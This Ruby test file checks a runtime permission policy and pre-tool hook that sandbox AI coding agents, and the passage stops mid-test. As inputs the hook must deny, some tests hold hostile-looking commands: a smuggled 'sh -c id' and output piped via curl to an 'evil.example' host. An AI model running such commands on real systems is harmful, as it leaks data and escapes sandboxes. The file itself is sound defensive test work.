require "test_helper"
require "json"
require "open3"
require "hive/agent_profiles"
require "hive/scripts/workflow_policy_hook"
require "hive/workflow_package/runtime_policy"

class WorkflowPackageRuntimePolicyTest < Minitest::Test
  include HiveTestHelper

  def test_compiles_restrictive_claude_policy_and_materializes_hive_owned_settings
    with_tmp_dir do |dir|
      task = File.join(dir, "task")
      policy_dir = File.join(dir, "policy")
      FileUtils.mkdir_p(task)
      policy = Hive::WorkflowPackage::RuntimePolicy.compile(
        permissions,
        task_folder: task,
        profile: Hive::AgentProfiles.lookup(:claude),
        policy_dir: policy_dir
      )

      assert_equal "dontAsk", policy.permission_mode
      assert_equal %w[Bash Grep Read WebFetch], policy.allowed_tools
      assert_includes policy.disallowed_tools, "WebSearch"
      assert_equal [ File.realpath(task), File.join(File.realpath(task), "reports") ], policy.directories
      assert_equal [ "git diff *", "git status" ], policy.commands
      assert_equal [ "api.example.com" ], policy.domains
      assert_equal policy_dir, File.dirname(policy.settings_path)
      assert_equal({ "mcpServers" => {} }, JSON.parse(File.read(policy.mcp_config_path)))
      settings = JSON.parse(File.read(policy.settings_path))
      assert_equal policy.directories.drop(1), settings.fetch("permissions").fetch("additionalDirectories")
      assert settings.fetch("hooks").key?("PreToolUse")
      sandbox = settings.fetch("sandbox")
      assert sandbox.fetch("enabled")
      assert sandbox.fetch("failIfUnavailable")
      assert_equal false, sandbox.fetch("allowUnsandboxedCommands")
      assert_equal [ "api.example.com" ], sandbox.dig("network", "allowedDomains")
      assert_equal policy.directories, sandbox.dig("filesystem", "allowWrite")
      assert_equal [ "--settings", policy.settings_path, "--setting-sources", "",
                     "--mcp-config", policy.mcp_config_path, "--strict-mcp-config" ], policy.cli_flags
      refute_includes policy.environment.fetch("PATH"), task
    end
  end

  def test_rejects_unsupported_runner_yolo_overlap_and_unrestricted_bash
    with_tmp_dir do |dir|
      task = File.join(dir, "task")
      FileUtils.mkdir_p(task)
      codex = Hive::AgentProfiles.lookup(:codex)
      assert_raises(Hive::ConfigError) do
        Hive::WorkflowPackage::RuntimePolicy.compile(
          permissions, task_folder: task, profile: codex, policy_dir: File.join(dir, "codex")
        )
      end

      assert_raises(Hive::ConfigError) do
        Hive::WorkflowPackage::RuntimePolicy.compile(
          permissions.merge("deny" => [ "Read" ]),
          task_folder: task, profile: Hive::AgentProfiles.lookup(:claude), policy_dir: File.join(dir, "overlap")
        )
      end

      assert_raises(Hive::ConfigError) do
        Hive::WorkflowPackage::RuntimePolicy.compile(
          permissions.merge("commands" => []),
          task_folder: task, profile: Hive::AgentProfiles.lookup(:claude), policy_dir: File.join(dir, "bash")
        )
      end
    end
  end

  def test_pre_tool_hook_denies_undeclared_compound_command_and_network_domain
    with_tmp_dir do |dir|
      task = File.join(dir, "task")
      FileUtils.mkdir_p(task)
      policy = Hive::WorkflowPackage::RuntimePolicy.compile(
        permissions,
        task_folder: task,
        profile: Hive::AgentProfiles.lookup(:claude),
        policy_dir: File.join(dir, "policy")
      )

      allowed = run_hook(policy, "Bash", { "command" => "git status && git diff --stat" })
      assert_equal "allow", allowed.dig("hookSpecificOutput", "permissionDecision")

      denied = run_hook(policy, "Bash", { "command" => "git diff --stat & sh -c id" })
      assert_equal "deny", denied.dig("hookSpecificOutput", "permissionDecision")

      denied = run_hook(policy, "Bash", { "command" => "git status | curl https://evil.example" })
      assert_equal "deny", denied.dig("hookSpecificOutput", "permissionDecision")

      denied = run_hook(policy, "WebFetch", { "url" => "https://evil.example/data" })
      assert_equal "deny", denied.dig("hookSpecificOutput", "permissionDecision")

      policy_data = JSON.parse(File.read(policy.policy_path))
      policy_data.fetch("commands") << "curl *"
      policy_data.fetch("executables")["curl"] = "/usr/bin/curl"
      File.write(policy.policy_path, JSON.generate(policy_data))
      allowed = run_hook(policy, "Bash", { "command" => "curl https://api.example.com/data" })
      assert_equal "allow", allowed.dig("hookSpecificOutput", "permissionDecision")
      denied = run_hook(policy, "Bash", { "command" => "curl https://evil.example/data" })
      assert_equal "deny", denied.dig("hookSpecificOutput", "permissionDecision")
      denied = run_hook(policy, "Bash", { "command" => "curl evil.example/data" })
      assert_equal "deny", denied.dig("hookSpecificOutput", "permissionDecision")

      outside = File.join(dir, "outside")
      FileUtils.mkdir_p(outside)
      File.symlink(outside, File.join(task, "linked"))
      denied = run_hook(policy, "Read", { "file_path" => File.join(task, "linked", "future.txt") })
      assert_equal "deny", denied.dig("hookSpecificOutput", "permissionDecision")
    end
  end

  def test_directory_declaration_rejects_a_symlink_whose_target_escapes_the_task
    with_tmp_dir do |dir|
      task = File.join(dir, "task")
      outside = File.join(dir, "outside")
      FileUtils.mkdir_p([ task, outside ])
      File.symlink(outside, File.join(task, "reports"))
      assert_raises(Hive::ConfigError) do
        Hive::WorkflowPackage::RuntimePolicy.compile(
          permissions, task_folder: task, profile: Hive::AgentProfiles.lookup(:claude),
          policy_dir: File.join(dir, "policy")
        )
      end
    end
  end

  def test_pre_tool_hook_rejects_undeclared_tools_and_malformed_inputs_without_crashing
    with_tmp_dir do |dir|
      task = File.join(dir, "task")
      FileUtils.mkdir_p(task)
      policy = Hive::WorkflowPackage::RuntimePolicy.compile(
        permissions,
        task_folder: task,
        profile: Hive::AgentProfiles.lookup(:claude),
        policy_dir: File.join(dir, "policy")
      )

      denied = run_hook(policy, "Write", { "file_path" => File.join(task, "result.md") })
      assert_equal "deny", denied.dig("hookSpecificOutput", "permissionDecision")

      denied = run_hook(policy, "Bash", { "command" => "git \'unterminated" })
      assert_equal "deny", denied.dig("hookSpecificOutput", "permissionDecision")

      policy_data = JSON.parse(File.read(policy.policy_path))
      policy_data.fetch("commands") << "curl *"
      policy_data.fetch("executables")["curl"] = "/usr/bin/curl"
      File.write(policy.policy_path, JSON.generate(policy_data))
      denied = run_hook(policy, "Bash", { "command" => "curl https://[" })
      assert_equal "deny", denied.dig("hookSpecificOutput", "permissionDecision")

      denied = run_hook(policy, "WebFetch", { "url" => "https://[" })
      assert_equal "deny", denied.dig("hookSpecificOutput", "permissionDecision")
    end
  end

  def test_notebook_edit_uses_its_real_path_field_and_fails_closed
    with_tmp_dir do |dir|
      task = File.join(dir, "task")
      outside = File.join(dir, "outside.ipynb")
      FileUtils.mkdir_p(task)
      policy = {
        "allowed_tools" => [ "NotebookEdit" ],
        "directories" => [ File.realpath(task) ],
        "commands" => [], "domains" => [], "executables" => {}
      }

      decision, = Hive::Scripts::WorkflowPolicyHook.evaluate(
        policy, "tool_name" => "NotebookEdit", "tool_input" => { "notebook_path" => outside }
      )
      assert_equal "deny", decision
      decision, = Hive::Scripts::WorkflowPolicyHook.evaluate(
        policy, "tool_name" => "NotebookEdit", "tool_input" => {}
      )
      assert_equal "deny", decision
      decision, = Hive::Scripts::WorkflowPolicyHook.evaluate(
        policy, "tool_name" => "NotebookEdit",
        "tool_input" => { "notebook_path" => File.join(task, "analysis.ipynb") }
      )
      assert_equal "allow", decision

      policy["allowed_tools"] << "LS"
      decision, = Hive::Scripts::WorkflowPolicyHook.evaluate(
        policy, "tool_name" => "LS", "tool_input" => { "path" => File.join(task, "reports") }
      )
      assert_equal "allow", decision
    end
  end

  def test_hook_path_resolution_falls_back_safely_when_realpath_is_unavailable
    candidate = File.join(Dir.tmpdir, "hive-hook-missing", "future.txt")
    original = File.method(:realpath)
    File.define_singleton_method(:realpath) { |*| raise Errno::EACCES }
    begin
      assert_equal File.expand_path(candidate),
                   Hive::Scripts::WorkflowPolicyHook.resolve_with_existing_ancestor(candidate)
    ensure
      File.define_singleton_method(:realpath, original)
    end
  end

  def test_admission_rejects_an_explicit_actor_whose_runner_cannot_enforce_policy
    workflow = Hive::Workflow.new(
      id: :demo,
      stages: [
        Hive::Workflow::Stage.new(name: "work", index: 1, state_file: "work.md", kind: :agent, agent: :codex)
      ]
    )
    with_tmp_dir do |dir|
      task = File.join(dir, "task")
      FileUtils.mkdir_p(task)
      assert_raises(Hive::ConfigError) do
        Hive::WorkflowPackage::RuntimePolicy.admit_workflow!(
          workflow, permissions, task_folder: task, policy_dir: File.join(dir, "policy")
        )
      end
    end
  end

  def test_admission_compiles_council_reviewers_and_revise_agents
    reviewer = Hive::Workflow::Reviewer.new(
      name: "reviewer", permissions: permissions
    )
    revise = Hive::Workflow::Revise.new(permissions: permissions)
    workflow = Hive::Workflow.new(
      id: :demo,
      stages: [
        Hive::Workflow::Stage.new(
          name: "council", index: 1, state_file: "council.md", kind: :council,
          permissions: permissions, reviewers: [ reviewer ],
          council: Hive::Workflow::Council.new(quorum: 1, revise: revise)
        )
      ]
    )
    with_tmp_dir do |dir|
      task = File.join(dir, "task")
      FileUtils.mkdir_p(task)

      assert Hive::WorkflowPackage::RuntimePolicy.admit_workflow!(
        workflow, permissions, task_folder: task, policy_dir: File.join(dir, "policy")
      )
    end
  end

  def test_compile_rejects_unavailable_task_and_a_non_claude_runner_even_when_capable
    assert_raises(Hive::ConfigError) do
      Hive::WorkflowPackage::RuntimePolicy.compile(
        permissions, task_folder: "/missing/hive-task-#{Process.pid}",
        profile: Hive::AgentProfiles.lookup(:claude), policy_dir: Dir.tmpdir
      )
    end

    profile = Hive::AgentProfile.new(
      name: :custom, bin_default: "custom", headless_flag: "-p", version_flag: "--version",
      skill_syntax_format: "/%{skill}",
      policy_capabilities: Hive::WorkflowPackage::RuntimePolicy::REQUIRED_CAPABILITIES
    )
    with_tmp_dir do |dir|
      FileUtils.mkdir_p(File.join(dir, "task"))
      assert_raises(Hive::ConfigError) do
        Hive::WorkflowPackage::RuntimePolicy.compile(
          permissions, task_folder: File.join(dir, "task"), profile: profile,
          policy_dir: File.join(dir, "policy")
        )
      end
    end
  end

  def test_compile_rejects_each_unsupported_declaration_shape
    invalid = [
      permissions.merge("tools" => [ "Read" ], "commands" => [ "git status" ]),
      permissions.merge("commands" => [ "git status |" ]),
      permissions.merge("commands" => [ "git status &" ]),
      permissions.merge("commands" => [ "git st*" ]),
      permissions.merge("commands" => [ "git '" ]),
      permissions.merge("credentials" => [ "token" ]),
      permissions.merge("directories" => [ "/tmp" ]),
      permissions.merge("tools" => "Read")
    ]
    with_tmp_dir do |dir|
      task = File.join(dir, "task")
      FileUtils.mkdir_p(task)
      invalid.each_with_index do |declaration, index|
        assert_raises(Hive::ConfigError) do
          Hive::WorkflowPackage::RuntimePolicy.compile(
            declaration, task_folder: task, profile: Hive::AgentProfiles.lookup(:claude),
            policy_dir: File.join(dir, "policy-#{index}")
          )
        end
      end
    end
  end

  def test_declared_executable_cannot_resolve_inside_the_task
    with_tmp_dir do |dir|
      task = File.join(dir, "task")
      FileUtils.mkdir_p(task)
      executable = File.join(task, "tool")
      File.write(executable, "#!/bin/sh\n")
      FileUtils.chmod(0o755, executable)
      declaration = permissions.merge(
        "tools" => [ "Bash" ], "commands" => [ "#{executable} status" ],
        "domains" => []
      )

      assert_raises(Hive::ConfigError) do
        Hive::WorkflowPackage::RuntimePolicy.compile(
          declaration, task_folder: task, profile: Hive::AgentProfiles.lookup(:claude),
          policy_dir: File.join(dir, "policy")
        )
      end
    end
  end

  def test_executable_lookup_ignores_realpath_failures
    with_tmp_dir do |dir|
      task = File.join(dir, "task")
      bin = File.join(dir, "bin")
      FileUtils.mkdir_p([ task, bin ])
      executable = File.join(bin, "tool")
      File.write(executable, "#!/bin/sh\n")
      FileUtils.chmod(0o755, executable)
      compiler = Hive::WorkflowPackage::RuntimePolicy.new(
        permissions, task_folder: task, profile: Hive::AgentProfiles.lookup(:claude),
        policy_dir: File.join(dir, "policy")
      )
      original = File.method(:realpath)
      File.define_singleton_method(:realpath) do |path|
        raise Errno::EACCES if path == executable

        original.call(path)
      end
      begin
        with_env("PATH" => bin) { assert_nil compiler.send(:find_executable, "tool") }
      ensure
        File.define_singleton_method(:realpath, original)
      end
    end
  end

  def test_generated_hook_command_executes_the_library_entrypoint
    with_tmp_dir do |dir|
      task = File.join(dir, "task")
      FileUtils.mkdir_p(task)
      policy = Hive::WorkflowPackage::RuntimePolicy.compile(
        permissions, task_folder: task, profile: Hive::AgentProfiles.lookup(:claude),
        policy_dir: File.join(dir, "policy")
      )
      settings = JSON.parse(File.read(policy.settings_path))
      command = settings.dig("hooks", "PreToolUse", 0, "hooks", 0, "command")
      out, err, status = Open3.capture3(
        *Shellwords.split(command),
        stdin_data: JSON.generate("tool_name" => "Read", "tool_input" => { "file_path" => task })
      )

      assert status.success?, err
      assert_equal "allow", JSON.parse(out).dig("hookSpecificOutput", "permissionDecision")
    end
  end

  def test_actor_policy_rejects_malformed_inputs_and_unavailable_package_context
    with_tmp_dir do |dir|
      task = File.join(dir, "task")
      package = File.join(dir, "package")
      FileUtils.mkdir_p([ task, package ])
      profile = Hive::AgentProfiles.lookup(:claude)

      [ { "PATH" => "override" }, { "SEO_TOKEN" => :not_a_string } ].each_with_index do |environment, index|
        error = assert_raises(Hive::ConfigError) do
          Hive::WorkflowPackage::RuntimePolicy.compile_actor(
            "read-only", task_folder: task, package_root: package, profile: profile,
            environment: environment
          )
        end
        assert_match(/environment is malformed/, error.message)
      end

      error = assert_raises(Hive::ConfigError) do
        Hive::WorkflowPackage::RuntimePolicy.compile_actor(
          "read-only", task_folder: task, package_root: File.join(dir, "missing"), profile: profile
        )
      end
      assert_match(/package context is unavailable/, error.message)
    end
  end

  def test_scoped_codex_actor_uses_read_only_native_policy_and_host_materializes_exact_outputs
    with_tmp_dir do |dir|
      task = File.join(dir, "task")
      package = File.join(dir, "package")
      FileUtils.mkdir_p([ task, package ])
      article = File.join(task, "article.md")
      verification = File.join(task, "verification.md")
      spec = {
        "preset" => "scoped",
        "tools" => [
          "Read", "LS", "Grep", "Glob", "WebSearch",
          "Edit(./article.md)", "Edit(./verification.md)"
        ]
      }

      policy = with_env("HIVE_CODEX_BIN" => "/bin/true") do
        Hive::WorkflowPackage::RuntimePolicy.compile_actor(
          spec,
          task_folder: task,
          package_root: package,
          profile: Hive::AgentProfiles.lookup(:codex),
          managed_outputs: [ article ]
        )
      end

      assert policy.host_outputs?
      assert_equal [], policy.permission_flags
      assert_equal [], policy.agent_add_dirs
      assert_equal File.realpath("/bin/true"), policy.executable
      assert_includes policy.cli_flags, "--output-schema"
      assert_includes policy.cli_flags, 'web_search="live"'
      assert_includes policy.decorate_prompt("draft"), "`article.md`"
      assert_includes policy.decorate_prompt("draft"), "`verification.md`"
      assert_equal [ "verification.md", "article.md" ], policy.output_paths.keys

      policy.materialize_outputs!(
        status: :ok,
        final_message: JSON.generate(
          "files" => {
            "article.md" => "Article\n<!-- COMPLETE -->\n",
            "verification.md" => "grounding: grounded\n<!-- COMPLETE -->\n"
          }
        ),
        final_message_truncated: false
      )
      assert_equal "Article\n<!-- COMPLETE -->\n", File.read(article)
      assert_equal "grounding: grounded\n<!-- COMPLETE -->\n", File.read(verification)

      cleanup = policy.cleanup_paths.first
      assert File.directory?(cleanup)
      policy.cleanup!
      refute File.exist?(cleanup)
      policy.cleanup!
    end
  end

  def test_host_materialization_rejects_every_invalid_response_without_writing
    with_tmp_dir do |dir|
      task = File.join(dir, "task")
      package = File.join(dir, "package")
      FileUtils.mkdir_p([ task, package ])
      article = File.join(task, "article.md")
      verification = File.join(task, "verification.md")
      policy = with_env("HIVE_CODEX_BIN" => "/bin/true") do
        Hive::WorkflowPackage::RuntimePolicy.compile_actor(
          {
            "preset" => "scoped",
            "tools" => [ "Read", "Edit(./article.md)", "Edit(./verification.md)" ]
          },
          task_folder: task,
          package_root: package,
          profile: Hive::AgentProfiles.lookup(:codex),
          managed_outputs: [ article ]
        )
      end
      valid_files = {
        "article.md" => "article\n",
        "verification.md" => "verification\n"
      }
      invalid_results = {
        truncated: {
          final_message: JSON.generate("files" => valid_files),
          final_message_truncated: true
        },
        malformed: {
          final_message: '{"files":',
          final_message_truncated: false
        },
        malformed_shape: {
          final_message: "[]",
          final_message_truncated: false
        },
        missing_key: {
          final_message: JSON.generate("files" => valid_files.except("verification.md")),
          final_message_truncated: false
        },
        extra_key: {
          final_message: JSON.generate("files" => valid_files.merge("extra.md" => "extra\n")),
          final_message_truncated: false
        },
        empty_value: {
          final_message: JSON.generate("files" => valid_files.merge("article.md" => "")),
          final_message_truncated: false
        }
      }

      invalid_results.each do |name, result|
        error = assert_raises(Hive::ConfigError, name.to_s) do
          policy.materialize_outputs!(result.merge(status: :ok))
        end
        refute_empty error.message
        refute File.exist?(article), name.to_s
        refute File.exist?(verification), name.to_s
      end
    ensure
      policy&.cleanup!
    end
  end

  def test_host_materialization_restores_earlier_output_when_commit_artifact_write_fails
    with_tmp_dir do |dir|
      task = File.join(dir, "task")
      package = File.join(dir, "package")
      FileUtils.mkdir_p([ task, package ])
      article = File.join(task, "article.md")
      verification = File.join(task, "verification.md")
      File.write(article, "old article\n")
      File.write(verification, "old verification\n")
      FileUtils.chmod(0o600, verification)
      policy = with_env("HIVE_CODEX_BIN" => "/bin/true") do
        Hive::WorkflowPackage::RuntimePolicy.compile_actor(
          {
            "preset" => "scoped",
            "tools" => [ "Read", "Edit(./article.md)", "Edit(./verification.md)" ]
          },
          task_folder: task,
          package_root: package,
          profile: Hive::AgentProfiles.lookup(:codex),
          managed_outputs: [ article ]
        )
      end
      writes = []
      original_write = Hive::AtomicFile.method(:write)
      replacement = lambda do |path, content, **kwargs|
        writes << [ path, content ]
        raise IOError, "injected commit-artifact failure" if
          path == article && content == "new article\n"

        original_write.call(path, content, **kwargs)
      end

      error = with_replaced_singleton_method(Hive::AtomicFile, :write, replacement) do
        assert_raises(Hive::ConfigError) do
          policy.materialize_outputs!(
            status: :ok,
            final_message: JSON.generate(
              "files" => {
                "article.md" => "new article\n",
                "verification.md" => "new verification\n"
              }
            ),
            final_message_truncated: false
          )
        end
      end

      assert_includes error.message, "injected commit-artifact failure"
      assert_equal [ verification, article ], writes.first(2).map(&:first)
      assert_equal "old article\n", File.read(article)
      assert_equal "old verification\n", File.read(verification)
      assert_equal 0o600, File.stat(verification).mode & 0o777
    ensure
      policy&.cleanup!
    end
  end

  def test_codex_doctor_accepts_valid_runtime_provenance_when_aggregate_fails
    profile = Object.new
    profile.define_singleton_method(:bin) { "codex-nonzero-doctor" }
    status = Object.new
    status.define_singleton_method(:success?) { false }
    report = {
      "checks" => {
        "runtime.provenance" => {
          "details" => { "current executable" => "/bin/true" }
        }
      }
    }
    captured_argv = nil
    captured_timeout = nil
    captured_environment = nil
    probe_home = nil
    probe_home_visible = false
    capture = lambda do |*argv, timeout_sec:, environment:|
      captured_argv = argv
      captured_timeout = timeout_sec
      captured_environment = environment
      probe_home = environment.fetch("CODEX_HOME")
      probe_home_visible = File.directory?(probe_home)
      [ JSON.generate(report), "unrelated doctor failure", status ]
    end
    reset_codex_executable_cache

    resolved = with_replaced_singleton_method(
      Hive::WorkflowPackage::RuntimePolicy, :capture3_bounded, capture
    ) do
      Hive::WorkflowPackage::RuntimePolicy.codex_executable(profile)
    end

    assert_equal File.realpath("/bin/true"), resolved
    assert_equal [ "codex-nonzero-doctor", "doctor", "--json" ], captured_argv
    assert_equal Hive::WorkflowPackage::RuntimePolicy::CODEX_DOCTOR_TIMEOUT_SEC, captured_timeout
    assert_equal({ "CODEX_HOME" => probe_home }, captured_environment)
    assert probe_home_visible
    refute File.exist?(probe_home)
  ensure
    reset_codex_executable_cache
  end

  def test_codex_doctor_probe_is_bounded_and_fails_closed_on_timeout
    profile = Object.new
    profile.define_singleton_method(:bin) { "codex-slow-doctor" }
    captured_timeout = nil
    probe_home = nil
    probe_home_visible = false
    capture = lambda do |*_argv, timeout_sec:, environment:|
      captured_timeout = timeout_sec
      probe_home = environment.fetch("CODEX_HOME")
      probe_home_visible = File.directory?(probe_home)
      raise Timeout::Error
    end
    reset_codex_executable_cache

    error = with_replaced_singleton_method(
      Hive::WorkflowPackage::RuntimePolicy, :capture3_bounded, capture
    ) do
      assert_raises(Hive::ConfigError) do
        Hive::WorkflowPackage::RuntimePolicy.codex_executable(profile)
      end
    end

    assert_includes error.message, "timed out after 30s"
    assert_equal Hive::WorkflowPackage::RuntimePolicy::CODEX_DOCTOR_TIMEOUT_SEC, captured_timeout
    assert probe_home_visible
    refute File.exist?(probe_home)
  ensure
    reset_codex_executable_cache
  end

  def test_codex_doctor_nonzero_status_without_valid_provenance_fails_closed
    profile = Object.new
    profile.define_singleton_method(:bin) { "codex-invalid-doctor" }
    status = Object.new
    status.define_singleton_method(:success?) { false }
    probe_home = nil
    probe_home_visible = false
    capture = lambda do |*_argv, timeout_sec:, environment:|
      probe_home = environment.fetch("CODEX_HOME")
      probe_home_visible = File.directory?(probe_home)
      [ JSON.generate("checks" => {}), "aggregate failure", status ]
    end
    reset_codex_executable_cache

    error = with_replaced_singleton_method(
      Hive::WorkflowPackage::RuntimePolicy, :capture3_bounded, capture
    ) do
      assert_raises(Hive::ConfigError) do
        Hive::WorkflowPackage::RuntimePolicy.codex_executable(profile)
      end
    end

    assert_includes error.message, "aggregate failure"
    assert probe_home_visible
    refute File.exist?(probe_home)
  ensure
    reset_codex_executable_cache
  end

  def test_scoped_codex_actor_adds_trusted_caller_roots_as_read_only_without_expanding_outputs
    with_tmp_dir do |dir|
      task = File.join(dir, "task")
      package = File.join(dir, "package")
      worktree = File.join(dir, "repository-worktree")
      FileUtils.mkdir_p([ task, package, worktree ])
      output = File.join(task, "article.md")

      policy = with_env("HIVE_CODEX_BIN" => "/bin/true") do
        Hive::WorkflowPackage::RuntimePolicy.compile_actor(
          {
            "preset" => "scoped",
            "tools" => [ "Read", "Edit(./article.md)" ]
          },
          task_folder: task,
          package_root: package,
          profile: Hive::AgentProfiles.lookup(:codex),
          base_add_dirs: [ worktree ],
          managed_outputs: [ output ]
        )
      end

      resolved_worktree = File.realpath(worktree)
      assert_includes policy.directories, resolved_worktree
      filesystem_flag = policy.cli_flags.find { |flag| flag.include?("filesystem=") }
      assert_includes filesystem_flag, "#{JSON.generate(resolved_worktree)}=\"read\""
      assert_equal({ "article.md" => output }, policy.output_paths)

      error = assert_raises(Hive::ConfigError) do
        with_env("HIVE_CODEX_BIN" => "/bin/true") do
          Hive::WorkflowPackage::RuntimePolicy.compile_actor(
            {
              "preset" => "scoped",
              "tools" => [ "Read", "Edit(./article.md)" ]
            },
            task_folder: task,
            package_root: package,
            profile: Hive::AgentProfiles.lookup(:codex),
            base_add_dirs: [ worktree ],
            managed_outputs: [ File.join(worktree, "article.md") ]
          )
        end
      end
      assert_includes error.message, "escapes the task folder"
    ensure
      policy&.cleanup!
    end
  end

  def test_portable_actor_rejects_unavailable_or_non_directory_trusted_caller_roots
    with_tmp_dir do |dir|
      task = File.join(dir, "task")
      package = File.join(dir, "package")
      file_root = File.join(dir, "not-a-directory")
      FileUtils.mkdir_p([ task, package ])
      File.write(file_root, "fixture")

      [ File.join(dir, "missing"), file_root ].each do |root|
        error = assert_raises(Hive::ConfigError) do
          with_env("HIVE_CODEX_BIN" => "/bin/true") do
            Hive::WorkflowPackage::RuntimePolicy.compile_actor(
              "read-only",
              task_folder: task,
              package_root: package,
              profile: Hive::AgentProfiles.lookup(:codex),
              base_add_dirs: [ root ]
            )
          end
        end
        assert_includes error.message, "trusted read root"
      end
    end
  end

  def test_portable_actor_rejects_outputs_not_covered_by_edit_rules
    with_tmp_dir do |dir|
      task = File.join(dir, "task")
      package = File.join(dir, "package")
      FileUtils.mkdir_p([ task, package ])

      error = assert_raises(Hive::ConfigError) do
        with_env("HIVE_CODEX_BIN" => "/bin/true") do
          Hive::WorkflowPackage::RuntimePolicy.compile_actor(
            {
              "preset" => "scoped",
              "tools" => [ "Read", "Edit(./article.md)" ]
            },
            task_folder: task,
            package_root: package,
            profile: Hive::AgentProfiles.lookup(:codex),
            managed_outputs: [ File.join(task, "secret.md") ]
          )
        end
      end
      assert_includes error.message, "not authorized by an Edit rule"
    end
  end

  def test_host_materialization_rejects_symlinked_and_unreadable_output_targets
    with_tmp_dir do |dir|
      task = File.join(dir, "task")
      package = File.join(dir, "package")
      outside = File.join(dir, "outside.md")
      output = File.join(task, "article.md")
      FileUtils.mkdir_p([ task, package ])
      File.write(outside, "outside\n")
      policy = with_env("HIVE_CODEX_BIN" => "/bin/true") do
        Hive::WorkflowPackage::RuntimePolicy.compile_actor(
          {
            "preset" => "scoped",
            "tools" => [ "Read", "Edit(./article.md)" ]
          },
          task_folder: task,
          package_root: package,
          profile: Hive::AgentProfiles.lookup(:codex),
          managed_outputs: [ output ]
        )
      end
      result = {
        status: :ok,
        final_message: JSON.generate("files" => { "article.md" => "new\n" }),
        final_message_truncated: false
      }

      File.symlink(outside, output)
      error = assert_raises(Hive::ConfigError) { policy.materialize_outputs!(result) }
      assert_includes error.message, "cannot be a symlink"
      File.unlink(output)

      original_lstat = File.method(:lstat)
      failing_lstat = lambda do |path|
        raise Errno::EACCES, path if path == output

        original_lstat.call(path)
      end
      error = with_replaced_singleton_method(File, :lstat, failing_lstat) do
        assert_raises(Hive::ConfigError) { policy.materialize_outputs!(result) }
      end
      assert_includes error.message, "could not be snapshotted"
      refute File.exist?(output)
    ensure
      policy&.cleanup!
    end
  end

  def test_confined_output_rejects_escaping_and_unavailable_parent_resolution
    with_tmp_dir do |dir|
      task = File.join(dir, "task")
      outside = File.join(dir, "outside")
      FileUtils.mkdir_p([ task, outside ])
      linked = File.join(task, "linked")
      File.symlink(outside, linked)

      error = assert_raises(Hive::ConfigError) do
        Hive::WorkflowPackage::RuntimePolicy::Policy.ensure_confined_output!(
          File.realpath(task), File.join(linked, "article.md")
        )
      end
      assert_includes error.message, "parent escapes"

      target = File.join(task, "blocked", "article.md")
      original_realpath = File.method(:realpath)
      blocked_realpath = lambda do |path|
        raise Errno::EACCES, path if path == File.dirname(target)

        original_realpath.call(path)
      end
      error = with_replaced_singleton_method(File, :realpath, blocked_realpath) do
        assert_raises(Hive::ConfigError) do
          Hive::WorkflowPackage::RuntimePolicy::Policy.ensure_confined_output!(
            File.realpath(task), target
          )
        end
      end
      assert_includes error.message, "parent is unavailable"
    end
  end

  def test_host_materialization_removes_new_companion_output_on_commit_failure
    with_tmp_dir do |dir|
      task = File.join(dir, "task")
      package = File.join(dir, "package")
      article = File.join(task, "article.md")
      verification = File.join(task, "verification.md")
      FileUtils.mkdir_p([ task, package ])
      policy = compile_two_output_codex_policy(
        task: task, package: package, article: article
      )
      original_write = Hive::AtomicFile.method(:write)
      failing_write = lambda do |path, content, **kwargs|
        raise IOError, "commit failed" if path == article

        original_write.call(path, content, **kwargs)
      end

      error = with_replaced_singleton_method(Hive::AtomicFile, :write, failing_write) do
        assert_raises(Hive::ConfigError) do
          policy.materialize_outputs!(
            managed_output_result(
              "article.md" => "new article\n",
              "verification.md" => "new verification\n"
            )
          )
        end
      end

      assert_includes error.message, "commit failed"
      refute File.exist?(article)
      refute File.exist?(verification)
    ensure
      policy&.cleanup!
    end
  end

  def test_host_materialization_reports_rollback_failure
    with_tmp_dir do |dir|
      task = File.join(dir, "task")
      package = File.join(dir, "package")
      article = File.join(task, "article.md")
      verification = File.join(task, "verification.md")
      FileUtils.mkdir_p([ task, package ])
      policy = compile_two_output_codex_policy(
        task: task, package: package, article: article
      )
      original_write = Hive::AtomicFile.method(:write)
      failing_write = lambda do |path, content, **kwargs|
        raise IOError, "commit failed" if path == article

        original_write.call(path, content, **kwargs)
      end
      original_rm_f = FileUtils.method(:rm_f)
      failing_rm_f = lambda do |path, *args, **kwargs|
        raise Errno::EACCES, path if path == verification

        original_rm_f.call(path, *args, **kwargs)
      end

      error = with_replaced_singleton_method(Hive::AtomicFile, :write, failing_write) do
        with_replaced_singleton_method(FileUtils, :rm_f, failing_rm_f) do
          assert_raises(Hive::ConfigError) do
            policy.materialize_outputs!(
              managed_output_result(
                "article.md" => "new article\n",
                "verification.md" => "new verification\n"
              )
            )
          end
        end
      end

      assert_includes error.message, "rollback failed"
      assert_includes error.message, verification
    ensure
      FileUtils.rm_f(verification) if verification
      policy&.cleanup!
    end
  end

  def test_portable_admission_and_trusted_roots_fail_closed_without_preparing_a_runtime
    with_tmp_dir do |dir|
      task = File.join(dir, "task")
      package = File.join(dir, "package")
      FileUtils.mkdir_p([ task, package ])

      policy = Hive::WorkflowPackage::RuntimePolicy.compile_actor(
        "read-only",
        task_folder: task,
        package_root: package,
        profile: Hive::AgentProfiles.lookup(:codex),
        prepare: false
      )
      refute policy.host_outputs?
      assert_equal "prompt", policy.decorate_prompt("prompt")
      assert_empty policy.cli_flags
      assert_nil policy.executable
      assert_empty policy.cleanup_paths
      assert_equal({ status: :ok }, policy.materialize_outputs!(status: :ok))

      [ "not-an-array", [ "" ], [ "bad\0root" ] ].each do |roots|
        error = assert_raises(Hive::ConfigError) do
          Hive::WorkflowPackage::RuntimePolicy.compile_actor(
            "read-only",
            task_folder: task,
            package_root: package,
            profile: Hive::AgentProfiles.lookup(:codex),
            base_add_dirs: roots,
            prepare: false
          )
        end
        assert_includes error.message, "trusted read root"
      end
    end
  end

  def test_portable_actor_rejects_unsupported_runner_tools_and_output_rule_shapes
    with_tmp_dir do |dir|
      task = File.join(dir, "task")
      package = File.join(dir, "package")
      FileUtils.mkdir_p([ task, package ])

      error = assert_raises(Hive::ConfigError) do
        Hive::WorkflowPackage::RuntimePolicy.compile_actor(
          "read-only",
          task_folder: task,
          package_root: package,
          profile: Hive::AgentProfiles.lookup(:pi),
          prepare: false
        )
      end
      assert_includes error.message, "cannot enforce managed workflow policy"

      error = assert_raises(Hive::ConfigError) do
        Hive::WorkflowPackage::RuntimePolicy.compile_actor(
          { "preset" => "scoped", "tools" => [ "Read", "Bash" ] },
          task_folder: task,
          package_root: package,
          profile: Hive::AgentProfiles.lookup(:codex),
          prepare: false
        )
      end
      assert_includes error.message, "cannot enforce managed tools"

      error = assert_raises(Hive::ConfigError) do
